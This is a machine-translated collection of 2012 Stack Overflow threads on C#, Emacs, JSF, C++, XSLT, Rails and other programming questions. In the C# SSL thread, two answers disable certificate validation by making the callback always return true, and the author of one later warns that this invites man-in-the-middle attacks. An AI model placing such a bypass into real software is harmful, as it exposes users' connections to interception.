    command.Parameters.AddWithValue("COL3", model.Perc);
    command.Parameters.AddWithValue("COL4", model.Amount);
    command.Parameters.AddWithValue("COL5", model.Status);
    command.Parameters.AddWithValue("COL6", model.UpdatedUser);
    command.Parameters.Add("COL7", OleDbType.Date).Value = DateTime.Now;
    command.ExecuteNonQuery();
}
} 
```

注意我不得不重新格式化这篇文章中的代码以删除对真实表的任何引用，因此它可能已经放入了一些类型。真正的代码会编译并运行。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-27T15:52:49.817

你可以修改

```
 sb.Append("INSERT INTO QRY.TABLE (COL1,COL2,COL3,COL4,COL5,COL6,COL7,SORTID) VALUES(@COL1,@COL2,@COL3,@COL4,@COL5,@COL6,@COL7,max_id);"); 
```

并修改这个

```
 command.Parameters.AddWithValue("@COL1", model.ID);
    command.Parameters.AddWithValue("@COL2", model.Description);
    command.Parameters.AddWithValue("@COL3", model.Perc);
    command.Parameters.AddWithValue("@COL4", model.Amount);
    command.Parameters.AddWithValue("@COL5", model.Status);
    command.Parameters.AddWithValue("@COL6", model.UpdatedUser);
    command.Parameters.Add("@COL7", OleDbType.Date).Value = DateTime.Now; 
```

# emacs - 如何在 Emacs 中的终端进程退出时自动终止缓冲区

> ID：12624815
> 
> 赞同：6
> 
> 时间：2012-09-27T15:23:10.357
> 
> 标签：emacs, process, exit, kill

当与之关联的进程结束时，如何自动终止终端缓冲区。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2014-05-16T02:16:09.223

我发现了更简单的方法，定义了一个建议`term-handle-exit`

```
(defadvice term-handle-exit
  (after term-kill-buffer-on-exit activate)
(kill-buffer)) 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-27T15:24:42.167

我发现我可以为此使用进程哨兵并将其设置为`term-exec-hook`

```
(add-hook 'term-exec-hook (lambda ()
            (let* ((buff (current-buffer))
                 (proc (get-buffer-process buff)))
            (lexical-let ((buff buff))
               (set-process-sentinel proc (lambda (process event)
                            (if (string= event "finished\n")
                                       (kill-buffer buff)))))))) 
```

# javascript - 在 jQtouch 中未打开外部链接

> ID：12624823
> 
> 赞同：3
> 
> 时间：2012-09-27T15:23:40.557
> 
> 标签：javascript, html, jqtouch

我正在使用 jQtouch 为文档管理器编写一个 Web 应用程序，并在其中添加了“热门搜索”部分。[您可以在http://dl.dropbox.com/u/97184921/Project/index.html](http://dl.dropbox.com/u/97184921/Project/index.html)查看整个内容

下面的代码应该显示一个包含两个项目的无序列表（它确实如此） - 一个链接到 Google，另一个链接到 BBC 作为测试网站。它们都应该有缩略图并显示出来，但是当点击链接时，它似乎不会将用户发送到 Google 或 BBC。任何人都可以帮忙吗？

```
 <li><a href = "http://www.google.co.uk/"><img height = "20" width = "20" src = "images/search.png">google</a></li>
        <li><a href = "http://www.bbc.co.uk/"><img height = "20" width = "20" src = "images/search.png">bbc</a></li> 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-09-27T15:27:29.813

在[jqtouch 网站上](http://www.jqtouch.com/preview/demos/main/#home)，他们建议您`target="_blank"`在打开外部链接时使用。

如果您想在同一窗口中打开链接，请尝试`rel="external"`

[来源](https://groups.google.com/forum/?fromgroups=#!topic/jqtouch/9lN72k0fh30)

提供更多信息的更好[来源](http://www.golen.net/blog/jqtouch-link-behaviors/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-27T15:28:08.747

问题似乎是您的链接被您的 javascript 挂钩，并且处理点击的脚本失败。

如果您在 FIreBug 中查看 javascript 控制台，您会在单击链接后发现如下错误：

> 选项[http://www.google.co.uk/](http://www.google.co.uk/) 405（不允许的方法） jquery.js:19 XMLHttpRequest 无法加载[http://www.google.co.uk/](http://www.google.co.uk/)。> Access-Control-Allow-Origin 不允许来源[http://dl.dropbox.com 。](http://dl.dropbox.com)

正如@davehale23 建议的那样，添加`target="_blank"`到您的链接将解决问题（同样您可以通过调整 FireBug 中的链接元素之一来测试这一点。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-27T15:34:43.250

```
<li><a href = "http://www.google.co.uk/" target="_blank"><img height = "20" width = "20" src = "images/search.png">google</a></li>
<li><a href = "http://www.bbc.co.uk/" target="_blank"><img height = "20" width = "20" src = "images/search.png">bbc</a></li> 
```

锚标记中的 target="_blank" 会打开一个新页面（或选项卡），而不是在当前浏览器窗口中打开它。这是最好的方法，因为如果用户想要返回您的网站，用户无需离开您的网站并处理缓存问题。

[http://jsfiddle.net/UCnY3/](http://jsfiddle.net/UCnY3/)

如果你使用谷歌浏览器的开发者工具会显示错误：

“拒绝显示文档，因为 X-Frame-Options 禁止显示。”

关于 X-Frame-Options 的更多信息可以在这里找到：

[https://developer.mozilla.org/en-US/docs/The_X-FRAME-OPTIONS_response_header](https://developer.mozilla.org/en-US/docs/The_X-FRAME-OPTIONS_response_header)

X-Frame-Options 有两个可能的值：

> DENY 该页面不能在框架中显示，无论站点是否尝试这样做。
> 
> SAMEORIGIN 页面只能显示在与页面本身同源的框架中。
> 
> 换句话说，如果您指定 DENY，则不仅尝试在框架中加载页面在从其他站点加载时会失败，而且在从同一站点加载时尝试这样做也会失败。另一方面，如果您指定 SAMEORIGIN，您仍然可以在框架中使用该页面，只要将其包含在框架中的站点与提供该页面的站点相同。

# java - JSF 2.0 使用链接在请求范围 bean 之间传递对象

> ID：12624829
> 
> 赞同：2
> 
> 时间：2012-09-27T15:23:57.830
> 
> 标签：java, jsf

一段时间以来，我试图在使用不同托管 bean 的两个页面之间传递一个对象。我正在使用 jsf 2.1 和 primefaces 3.1。

我的情况：

1.  我有一个**p:dataTable**并且一列是*h:link*用户可以单击以编辑当前对象
2.  单击后将打开一个新页面，其中将显示所选对象的内容以供进一步操作

我尝试从第 1 页发送一些参数作为 GET 请求并从第 2 页处理它们。它有效，但这不是我想要的解决方案。我需要选择的整个对象。我想在请求映射中传递它，或者将负责第 1 页的 bean 声明为 @SessionScoped 并从第二个注入这个 bean。

我没有成功的是在更改页面之前找出选择了哪个对象。我尝试使用 ajax 或链接标签的 actionListener，但没有任何效果。在执行 actionListener 或 ajax 事件之前，页面已更改...

如何首先设置选定的对象/行，然后才更改页面？

谢谢您的帮助。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2014-06-27T11:55:39.853

而不是 using `h:link`，您可能想使用`p:commandLink`，将所选对象设置为`actionListener`，并在阶段更改页面`oncomplete`，使用类似 的 javascript 行`location = 'page2.xhtml';`。

您可以在下面找到相关的标签文档。它也存在于 3.1 版中。

[http://www.primefaces.org/docs/vdl/3.4/primefaces-p/commandLink.html](http://www.primefaces.org/docs/vdl/3.4/primefaces-p/commandLink.html)

PS：无论是第 1 页还是第 2 页仍然需要是会话范围的，否则将无法正常工作。

# sas - 出错时停止 SAS 宏执行

> ID：12624830
> 
> 赞同：0
> 
> 时间：2012-09-27T15:24:01.977
> 
> 标签：sas

我在 SAS 中运行一个宏，它偶尔会产生如下错误：

> 错误：排序执行失败。

宏在此错误后继续处理，但我想强制它停止进一步执行。有没有办法做到这一点？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-27T15:36:22.943

评估自动宏变量`&syserr`并有条件地调用`%abort`看起来应该可以工作。

# c++ - 如何防止为 unique_ptr 删除 px.get()

> ID：12624835
> 
> 赞同：7
> 
> 时间：2012-09-27T15:24:38.577
> 
> 标签：c++, c++11

在 boost.org 网站上，我看到了一个阻止对 shared_ptr 删除 px.get() 的示例（[http://www.boost.org/doc/libs/1_51_0/libs/smart_ptr/sp_techniques.html#preventing_delete](http://www.boost.org/doc/libs/1_51_0/libs/smart_ptr/sp_techniques.html#preventing_delete)）。

这是一个很好的技术，我想在 C++11 中使用 std::unique_ptr 来应用它，经过一段时间的工具，我不能完全让他们的示例与 std::unique_ptr 一起使用。

是否可以防止在 std::unique_ptr 上调用 delete px.get() ？

这是 boost.org 网站上的代码，展示了如何防止 delete px.get 被调用：

```
class X
{
private:

    ~X();

    class deleter;
    friend class deleter;

    class deleter
    {
    public:

        void operator()(X * p) { delete p; }
    };

public:

    static shared_ptr<X> create()
    {
        shared_ptr<X> px(new X, X::deleter());
        return px;
    }
}; 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-27T15:43:42.243

虽然打电话`delete px.get()`是一件非常愚蠢的事情，但通常不是你试图阻止的事情，因为它不是你可以轻易做到的事情。也就是说，这是使用 unique_ptr 解决此问题的方法，但是它很丑陋，因为删除器的类型泄漏到了 unique_ptr 的类型中（当您查看 unique_ptr 与 shared_ptr 的实现细节时，为什么会变得很清楚），因此删除器必须是公开的，这意味着解决方案甚至不防水，因为任何人都可以使用删除器。除非您将删除器的构造函数设为私有并让 X 成为它的朋友，否则您还必须问自己的问题是为什么要麻烦？有人必须通过写作故意做错事`delete px.get()`才能成为问题。

```
class X
{
private:
   ~X() {}

public:
    struct deleter
    {
        void operator()(X * p) { delete p; }
    };

    static std::unique_ptr<X, deleter> create()
    {
      std::unique_ptr<X, deleter> px(new X, deleter());
      return px;
    }
}; 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-27T15:57:52.527

除了删除器的类型是's 类型`unique_ptr`的一部分之外，这个想法也保持不变。`unique_ptr`

```
#include <functional>
#include <memory>
#include <iostream>

using namespace std;

class X
{
private:

  ~X() {}

  class deleter
  {
  public:

    void operator()(X * p) { delete p; }
  };
  friend class deleter;

public:

  static shared_ptr<X> create_shared()
  {
    shared_ptr<X> px(new X, X::deleter());
    return px;
  }

  static unique_ptr<X, void(*)(X*)> create_unique()
  {
    return unique_ptr<X, void(*)(X*)>( new X, []( X *x ) { 
                                                  X::deleter()( x ); 
                                                } );
  }

  // If using VS2010
  static unique_ptr<X, std::function<void(X*)>> create_unique()
  {
    return unique_ptr<X, std::function<void(X*)>>( new X, X::deleter() );
  }
};

int main()
{
  auto x = X::create_shared();
  auto y = X::create_unique();
} 
```

VS2010 没有实现无捕获的 lambda 到函数指针的隐式转换，所以第一个`create_unique`将不起作用。

# c# - Web 客户端异常：底层连接已关闭：无法为 SSL/TLS 安全通道建立信任关系

> ID：12624841
> 
> 赞同：26
> 
> 时间：2012-09-27T15:24:55.860
> 
> 标签：c#, .net, ssl

我有一个简单的应用程序，它使用 C# Web Client 类下载网站 HTML。这是我正在使用的代码的精简示例：

```
WebClient wc = new WebClient();
wc.Headers.Add("user-agent",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; .NET CLR 1.0.3705;)");
htmlCode = wc.DownloadString("https://www.oig.hhs.gov/exclusions/exclusions_list.asp"); 
```

网站证书似乎有问题，因为我遇到了这个异常：

`The underlying connection was closed: Could not establish trust relationship for the SSL/TLS secure channel." "The remote certificate is invalid according to the validation procedure.`

如果您将链接复制并粘贴到浏览器中，则需要您同意风险，然后才能查看该网站。它是一个政府网站，所以我不担心任何病毒或任何东西。有没有办法告诉网络客户端绕过这个问题，并继续访问该站点？

* * *

## 回答 #1

> 赞同：55
> 
> 时间：2012-09-27T15:33:47.493

据我所知，这是因为他们使用了无效或过期的 SSL 证书。您可以使用以下方法绕过（忽略）它：

```
ServicePointManager.ServerCertificateValidationCallback += (sender, certificate, chain, sslPolicyErrors) => true; 
```

**2015年编辑**：

这篇文章得到了很多人的支持，但我对我的回答感到遗憾。它可能会消除您的错误，但不会解决问题。接受任何 SSL 证书都会使您容易受到中间人攻击，因此这通常是一个非常糟糕的主意。我将保留此答案以供将来参考，但请注意，您应该尝试从根本上解决问题，即确保 SSL 证书有效。

* * *

## 回答 #2

> 赞同：16
> 
> 时间：2012-09-27T15:41:05.237

*试试这个*：
您想要做的是将证书安装到您的本地计算机中。

如果它**不在**代码中，则该过程将执行以下操作：

1.  以管理员模式（不是 Chrome）打开 Internet Explorer。
2.  前往网站
3.  选择继续
4.  点击证书上的标题栏/网址栏，查看证书。
5.  单击安装证书。

因此，您可以尝试查看这些其他问题，看看它们是否对您有帮助：

*   [如何使用 c# 以编程方式将证书安装到本地机器存储中？](https://stackoverflow.com/questions/566570/how-can-i-install-a-certificate-into-the-local-machine-store-programmatically-us)
*   [在 C# 中将证书安装到 Windows 本地用户证书存储中](https://stackoverflow.com/questions/308554/install-certificates-in-to-the-windows-local-user-certificate-store-in-c-sharp)

尝试安装证书并查看是否再次访问该 url，如果它要求继续。

****编辑**：
我阅读了网站证书，这是因为证书和网站的网址不匹配。

一个简单的改变是这样的：

```
htmlCode = wc.DownloadString("https://oig.hhs.gov/exclusions/exclusions_list.asp"); 
```

只需删除 www。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2016-02-29T22:56:52.100

为了进一步构建 Leon Cullens 的答案，我想出了以下内容。就像他在回答中所说的那样，这不应该是您作为永久解决方案所做的事情，但如果您故意遇到此错误，这可能会对您有所帮助。这应该为您别无选择而只需要它工作的情况增加一点安全性。

我目前的情况是在开发目的期间，我需要使用自签名证书而不是真正的签名证书。这当然会导致以下错误......

> “底层连接已关闭：无法为 SSL/TLS 安全通道建立信任关系。”

这是我所做的尝试使其更加安全并尝试避免“中间人攻击”。我试图让它尽可能简短和简单，但想确保我画了整个画面以便于理解。

```
using System;
using System.Text;
using System.Net;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Threading;

namespace TestSecurity
{
    class TestDownload
    {
        private void client_DownloadProgressChanged(object sender, DownloadProgressChangedEventArgs e)
        {
            //Progress in the download
        }

        private void client_DownloadDataCompleted(object sender, DownloadDataCompletedEventArgs e)
        {
            //Download has completed
        }

        private bool client_RemoteCertificateValidation(object sender, X509Certificate certificate, X509Chain chain, SslPolicyErrors sslPolicyErrors)
        {
            if (sslPolicyErrors == SslPolicyErrors.RemoteCertificateChainErrors)
            {
                //Check to make sure the domain is correct
                X509Certificate2 certificate_details = (X509Certificate2)certificate;
                if (certificate_details.Thumbprint == "91A92CA60555DB51BEDDFE1AE4ECE54C8EBEBA97")
                {
                    #region Fingerprint for certificate
                    string storedFingerprint = "" +
                    "42048c788db687ed84407da10f78182e3487d1fc31c07ee131151f4e19b360ad2a8c452c2e7d614a5691d5479787fe70dabd" +
                    "64617465732e626c75656172726f77646576656c6f706d656e742e636f6d3110300e06035504080c0747656f72676961311f" +
                    "301d060355040a0c16426c7565204172726f7720446576656c6f706d656e74310b3009060355040613025553312f302d0609" +
                    "2a864886f70d0109011620737570706f727440626c75656172726f77646576656c6f706d656e742e636f6d31123010060355" +
                    "04070c09436c6576656c616e64301e170d3136303232393231313733335a170d3137303232383231313733335a3081b03129" +
                    "302706035504030c20757064617465732e626c75656172726f77646576656c6f706d656e742e636f6d3110300e0603550408" +
                    "42048c788db687ed84407da10f78182e3487d1fc31c07ee131151f4e19b360ad2a8c452c2e7d614a5691d5479787fe70dabd" +
                    "0613025553312f302d06092a864886f70d0109011620737570706f727440626c75656172726f77646576656c6f706d656e74" +
                    "2e636f6d3112301006035504070c09436c6576656c616e6430820122300d06092a864886f70d01010105000382010f003082" +
                    "010a0282010100a1cdf5af6f1bba5cc8495d8061895f39858fde814f5581266505bf4cbe0b26506278bc247963bb7c42f0b8" +
                    "b00638871932ed7d0a3c6562be8e5b513f24da2768051acde875b53bf94c8ea2cec397145db206b2524c42a2019a0bfa14e2" +
                    "a7ef0d311235e07b7e0363345fd7f397e365c0865b1b8fa8ad7eebdc1fcdce360db04f2822438621534ae10744155a710641" +
                    "9a69c16745974a37c5b06917036351b92c06540a6c70aa776c143eef6f7b8ec31c0c40a9eab8a399c9065bea688ea7bd1db2" +
                    "30af56d2ca0f8983f9e8dacb5613755fbcd8229d7042668a9130468a7480a2afde8c18bab895472ddf1ed2c49291c04e8cc2" +
                    "ff24db33d231b3a2498c03a5650203010001a34d304b301d0603551d0e0416041476b5c2c82ff138b87c0e2d6c046af4c634" +
                    "55040a0c16426c75652048c1f54dcb82e3487d1fc31c07ee1313fba9204c7b3232ba9204c7b323a021abcbda85bfca9c9931" +
                    "092a864886f70d01010b050003820101001ab0dfd318cc2e93a997445d0950ffcb63544c58fe1ded6e234aa7ccdcb5c890b1" +
                    "61b51ae08c1f54dcb3fbeca9c9932bde91d202b89c0b6f0af1a370017fa9f6a021abcbda85bfecebebc6d6067d4dc1e51ec5" +
                    "02cf95867516a84f01410cf80d7af4f0d3e9a86cf7b0323dba9204c7b3232c58b2289032a12aaa1ec4f64065da8bbde4fe47" +
                    "42048c788db687ed84407da10f78182e3487d1fc31c07ee131151f4e19b360ad2a8c452c2e7d614a5691d5479787fe70dabd" +
                    "de819522bb7ef870595d9738a6acdd39b7fcf6f36948ef2b404c2b6d7ebe577555148ad90013a5c2e812b2b907c808288040" +
                    "0db6702407585328f7e6c84b40451384391783001174d0";
                    #endregion

                    //Use the following to get the server's fingerprint to be saved and compared against
                    StringBuilder hex = new StringBuilder(certificate_details.RawData.Length * 2);
                    foreach (byte b in certificate_details.RawData)
                        hex.AppendFormat("{0:x2}", b);
                    string serverFingerprint = hex.ToString();

                    if (serverFingerprint == storedFingerprint) return true;
                    else return false;
                }
                else return false;
            }
            else if (sslPolicyErrors == SslPolicyErrors.None)
                return true;
            else
                return false;
        }

        public void TestDownload(Uri targetURL, bool useCredentials, string user, string pass)
        {
            WebClient client = new WebClient();
            bool taskCompleted = false;

            //Create the event handlers to monitor progress
            client.DownloadProgressChanged += new DownloadProgressChangedEventHandler(client_DownloadProgressChanged);
            client.DownloadDataCompleted += new DownloadDataCompletedEventHandler(client_DownloadDataCompleted);
            ServicePointManager.ServerCertificateValidationCallback += new RemoteCertificateValidationCallback(client_RemoteCertificateValidation);

            //Resolve the host
            IPHostEntry host = Dns.GetHostEntry(targetURL.Host);
            IPAddress ip = (host.AddressList.Length > 0 ? host.AddressList[0] : null);

            //Show the UI the resolved host

            //Account for credentials
            if (useCredentials)
            {
                NetworkCredential credentials = new NetworkCredential(
                    user,
                    pass);
                client.Credentials = credentials;
            }
            else client.Credentials = null;

            //Download file
            client.DownloadDataAsync(targetURL, taskCompleted);

            //Go to sleep until the file download has completed
            do { Thread.Sleep(500); } while (client.IsBusy);

            //File download complete

            //Destory the event handlers as they are no longer needed
            ServicePointManager.ServerCertificateValidationCallback -= client_RemoteCertificateValidation;
            client.DownloadProgressChanged -= client_DownloadProgressChanged;
            client.DownloadDataCompleted -= client_DownloadDataCompleted;
        }
    }
} 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2018-05-15T13:29:13.220

我对消息有这个问题：

> 无法为 SSL/TLS 安全通道建立信任关系。

我正在使用 .NET 客户端连接到 Apache 服务器上的 Web 服务。这就是为我解决问题的原因。

```
(proxy).UserAgent = "Apache-HttpClient/4.1.1 (java 1.5)"; 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2018-12-11T12:06:56.550

根据[这个答案](https://stackoverflow.com/a/11241204/2394837)，在使用 WebClient 实例之前添加这一行：

```
ServicePointManager.ServerCertificateValidationCallback = new        
RemoteCertificateValidationCallback(delegate { return true; }); 
```

# java - Where do we store key/passphrase/salt for encryption?

> ID：12624847
> 
> 赞同：9
> 
> 时间：2012-09-27T15:25:13.560
> 
> 标签：java, android, encryption

My app needs to encrypt some data (a user session token). Most examples I see around have a method that generates a Key using a passphrase and a salt, like:

```
public static Key generateKey(char[] passphrase, byte[] salt) {
    ...
} 
```

My understanding is that we have three options for generating the passphrase:

1.  Have the user enter it every time the app starts (annoying to the user).
2.  Hard-code the passphrase into the app itself. More convenient for the user, but someone can find out what your passphrase is given your app binary.
3.  Randomly generate a passphrase, but then we have to store the generated Key on disk. Now we've just shifted the problem to having to store the key securely on disk, which also seems impossible. If the attacker finds the generated key, big problem.

Option #1 won't work for me. Options #2 and #3 seem inherently flawed, unless I'm grossly misunderstanding how to go about this (hoping that I am). What's the recommended way to do this if we can't go with #1? Do we put in a bunch of obfuscated hoops for an attacker to jump through and hope for the best?

Thanks

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-27T15:40:06.293

“我们是否设置了一堆模糊的箍让攻击者跳过并希望得到最好的结果？” 基本上是的。箍的大小和数量取决于您想要制作的难度。

如果你不使用服务器，那么无论你做什么来混淆和加密你的数据都是可逆的。但是，你可以让它变得非常困难。例如，我用来保护某些视频资产的技术。

1.  将标头的前 1024 个字节（它是 MP4）替换为取自其中一个应用图像资产中间的 1024 个字节。我尝试了几个修复程序，但都无法自动恢复文件 - 尽管可以手动完成。然后...

2.  使用取自另一个图像资产的 256 字节的私钥加密文件。

3.  当密钥被提取出来时，它会通过一种算法进行散列，该算法会执行各种无意义的数学运算来破坏密钥。

4.  使用了预编译混淆器。

我已经尝试自己对此进行逆向工程，即使知道它是如何完成的，而且很难使努力不值得结果。

关于 SO 的讨论很多，总结如下：如果你只是想停止复制，那就让它变得困难（成本与回报），否则就睡得安稳，因为最终你无能为力。如果数据是商业敏感数据，则需要一个与系统级安全相结合的服务器（例如，整个设备加密和无根）。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-28T04:18:34.550

您将盐与加密数据一起存储，它不是秘密信息。您可以根据用户输入的内容或某种设备属性获取密钥：（散列）IMEI、MAC 地址等。

基本上，想想你是谁保护你的数据，为什么。由于用户需要这个，因此试图保护它免受他们的侵害没有多大意义。如果您将其存储在私人文件中，其他应用程序无法在非 root 手机上读取它。如果你想在有根手机上保护它，加密可能会有所帮助，但只要密钥存在于应用程序中，或者是基于设备上的某些东西派生的，它只会让它变得更难，而不是不可能恢复。

Android 确实有一个系统范围的密钥库服务，但它没有公共 API，并且可能会发生变化。如果您愿意冒您的应用程序在未来版本上中断的风险，您可以使用它来保护您的密钥。这里有一些细节：http: [//nelenkov.blogspot.com/2012/05/storing-application-secrets-in-androids.html](http://nelenkov.blogspot.com/2012/05/storing-application-secrets-in-androids.html)

# java - What is the default value for initial-heap-size (minimum heap size) in Java 6?

> ID：12624853
> 
> 赞同：2
> 
> 时间：2012-09-27T15:25:43.253
> 
> 标签：java, memory, memory-management, heap-memory

I know that it is 4MB in Java 1.4.2\. And according to:

[GC-Ergonomics](http://docs.oracle.com/javase/6/docs/technotes/guides/vm/gc-ergonomics.html)

The Miniumum on server-class-machines is 1/64th of the machine's physical memory. But what is the initial heap in Java6 on Machines with 1 CPU and/or less than 2GB Memory (non server-class machines)?

Thx

Hein

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-27T15:31:22.593

根据[5.0 Java[tm] Virtual Machine 中的 Ergonomics](http://www.oracle.com/technetwork/java/ergo5-140223.html#0.0.%20Garbage%20collector,%20heap,%20and%20runtime%20compiler|outline)，对于**非服务器类**机器，默认值与 1.4.2 版本的默认值相同，它们是：

> *   初始堆大小为 4 MB
>     
> *   最大堆大小为 64 MB

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-27T15:32:01.667

根据您提供的链接：

在运行带有并行垃圾收集器 (-XX:+UseParallelGC) 的 VM（客户端或服务器）的服务器级机器上

> **初始堆大小和最大堆大小已更改**

这意味着其他设置不会更改，并且对于所有其他情况，它们的默认值与 1.4.2 相同。

# xml - XSLT 检查一个属性，如果该属性不在一组已知的值中，我如何让它“什么都不做”？

> ID：12624855
> 
> 赞同：1
> 
> 时间：2012-09-27T15:25:47.687
> 
> 标签：xml, xslt, ccd

我正在使用 CCD XML 文档，它包含如下数据：

```
<tr ID="encounter17" >
    <td>09/18/2012</td>
    <td ID="type41">Office Visit</td>
    <td>Family Practice</td>
    <td>
        <paragraph>REDACTED</paragraph>
    </td>
    <td />
</tr>
<tr ID="encounter18" styleCode="altRow">
    <td>09/17/2012</td>
    <td ID="type42">Office Visit</td>
    <td>Family Practice</td>
    <td>
        <paragraph>REDACTED</paragraph>
    </td>
    <td />
</tr> 
```

我正在尝试使用“标准”CCD.xsl 将其呈现为 HTML，`Derived from HL7 Finland R2 Tyylitiedosto: Tyyli_R2_B3_01.xslt Updated by Calvin E. Beebe, Mayo Clinic - Rochester Mn.`

带有 ID`encounter17`的元素会渲染，带有 ID 的元素`encounter18`不会渲染。查看输出`xsltproc`是因为 XSLT 无法识别该`styleCode`属性。仅`Bold, Italic, Underline`受支持。

如何更改此 XSLT 以使其容忍未知的 styleCode？

```
<!--    Stylecode processing
  Supports Bold, Underline and Italics display-->
<xsl:template match="//n1:*[@styleCode]">

<xsl:if test="@styleCode='Bold'">
    <xsl:element name='b'>
        <xsl:apply-templates/>
    </xsl:element>
</xsl:if>

<xsl:if test="@styleCode='Italics'">
    <xsl:element name='i'>
        <xsl:apply-templates/>
    </xsl:element>
</xsl:if>

<xsl:if test="@styleCode='Underline'">
    <xsl:element name='u'>
        <xsl:apply-templates/>
    </xsl:element>
</xsl:if>

<xsl:if test="contains(@styleCode,'Bold') and contains(@styleCode,'Italics') and not (contains(@styleCode, 'Underline'))">
    <xsl:element name='b'>
        <xsl:element name='i'>
            <xsl:apply-templates/>
        </xsl:element>
    </xsl:element>
</xsl:if>

<xsl:if test="contains(@styleCode,'Bold') and contains(@styleCode,'Underline') and not (contains(@styleCode, 'Italics'))">
    <xsl:element name='b'>
        <xsl:element name='u'>
            <xsl:apply-templates/>
        </xsl:element>
    </xsl:element>
</xsl:if>

<xsl:if test="contains(@styleCode,'Italics') and contains(@styleCode,'Underline') and not (contains(@styleCode, 'Bold'))">
    <xsl:element name='i'>
        <xsl:element name='u'>
            <xsl:apply-templates/>
        </xsl:element>
    </xsl:element>
</xsl:if>

<xsl:if test="contains(@styleCode,'Italics') and contains(@styleCode,'Underline') and contains(@styleCode, 'Bold')">
    <xsl:element name='b'>
        <xsl:element name='i'>
            <xsl:element name='u'>
                <xsl:apply-templates/>
            </xsl:element>
        </xsl:element>
    </xsl:element>
</xsl:if> 
```

我已经尝试添加：

```
<xsl:if test="not (contains(@styleCode,'Italics')) and not (contains(@styleCode,'Underline')) and not (contains(@styleCode, 'Bold'))">
    <xsl:apply-templates/>
</xsl:if> 
```

这似乎只是呈现元素，它不会“落入”处理`<tr>`标签的 XSLT 部分。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-27T17:16:03.140

多么可怕的代码！在 2.0 中，您希望这样做：

```
<xsl:template match="n1:*[contains(@styleCode,'Bold')]" priority="100">
  <b><xsl:next-match/></b>
</xsl:template>

<xsl:template match="n1:*[contains(@styleCode,'Italic')]" priority="99">
  <i><xsl:next-match/></i>
</xsl:template>

<xsl:template match="n1:*[contains(@styleCode,'Underline')]" priority="98">
  <u><xsl:next-match/></u>
</xsl:template> 
```

基本上就是这样。这将忽略任何不在列表中的样式代码。

您可以在 1.0 中使用 xsl:apply-imports 执行相同的操作，但是这三个规则需要位于单独的样式表模块中。

# ruby-on-rails - 选择关系不为空的记录

> ID：12624862
> 
> 赞同：9
> 
> 时间：2012-09-27T15:25:59.480
> 
> 标签：ruby-on-rails, ruby-on-rails-3, activerecord

我在 Product 和 ProductCategory 之间有一对多的关系。

如何查询至少有一种产品关联的所有产品类别？

```
class Product < ActiveRecord::Base
  belongs_to  :product_category
end

class ProductCategory < ActiveRecord::Base
  has_many :products
end 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-09-27T18:51:20.040

```
ProductCategory.all(
  :joins => :products, 
  :select => "product_categories.*, count(products.id) as prod_count",
  :group => "product_categories.id"
) 
```

感谢伟大的 Ryan Bates 在这个截屏视频中发现了如何解决这个问题：[http ://railscasts.com/episodes/181-include-vs-joins](http://railscasts.com/episodes/181-include-vs-joins)

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-09-27T15:28:14.410

`ProductCategory.includes(:products).where('products.id is not null').all`

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2015-03-26T20:45:11.860

Joins 进行内部连接，因此其他一些答案中的 where 子句是多余的。当类别有多个产品时，按 products.id 分组将重复该类别，按 ProductCategory 分组将消除重复。

```
ProductCategory.joins(:products).group('product_categories.id') 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2014-06-26T09:18:16.157

一个更具可读性的解决方案：

```
ProductCategory.joins(:products).where('product_categories.id is not null').group('products.id') 
```

# c# - 为什么使用 JpegBitmapDecoder 的 LongRunning 任务 (TPL) 会耗尽资源？

> ID：12624867
> 
> 赞同：14
> 
> 时间：2012-09-27T15:26:22.943
> 
> 标签：c#, .net, task-parallel-library

我们有一个托管的 .Net / C# 应用程序，它创建 TPL 任务以对 JPEG 图像执行 JPEG 元数据编码。每个任务都使用 TaskCreationOptions.LongRunning 选项构造，例如，

```
Task task = new Task( () => TaskProc(), cancelToken, TaskCreationOptions.LongRunning ); 
```

TaskProc() 利用 JpegBitmapDecoder 和 JpegBitmapEncoder 类添加 JPEG 元数据并将新图像保存到磁盘。我们允许在任何时候最多有 2 个这样的任务处于活动状态，并且这个过程应该无限期地继续下去。

在执行上述操作一段时间后，当尝试创建 JpegBitmapDecoder 类的实例时，我们得到*没有足够的存储空间来处理此命令异常：*

> System.ComponentModel.Win32Exception (0x80004005):
> 在 MS.Win32.HwndWrapper..ctor(Int32 classStyle, Int32 style, Int32 exStyle, Int3 ) 的 MS.Win32.UnsafeNativeMethods.RegisterClassEx(WNDCLASSEX_D wc_d) 没有足够的存储空间来处理此命令2 x，Int32 y，Int32 宽度，Int32 高度，字符串名称，IntPtr 父级，HwndWrapperHook [] 挂钩）在 System.Windows.Threading.Dispatcher..ctor() 在 System.Windows.Threading.Dispatcher.get_CurrentDispatcher() 在System.Windows.Media.Imaging.JpegBitmapDecoder..ctor(Stream bitmapStream, BitmapCreateOptions createOptions, BitmapCacheOption cacheOption) 处的 System.Windows.Media.Imaging.BitmapDecoder..ctor(Stream bitmapStream, BitmapC reateOptions createOptions, BitmapCacheOption cacheOption, Guid expectedClsId)

